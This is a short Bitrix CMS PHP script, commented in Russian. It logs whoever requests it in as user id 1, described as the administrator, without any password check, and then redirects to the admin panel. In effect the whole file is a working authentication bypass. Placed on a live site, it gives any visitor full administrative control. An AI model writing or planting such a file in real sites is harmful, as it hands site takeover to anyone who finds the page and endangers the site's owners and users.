<?
		require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php"); //подключаем хидер
		global $USER; //объявляем переменную $USER
		$USER->Authorize(1); //авторизовываем пользователя под id = 1(в нашем случае админ)
		LocalRedirect("/bitrix/admin/"); //отправляем в админскую панель
	?>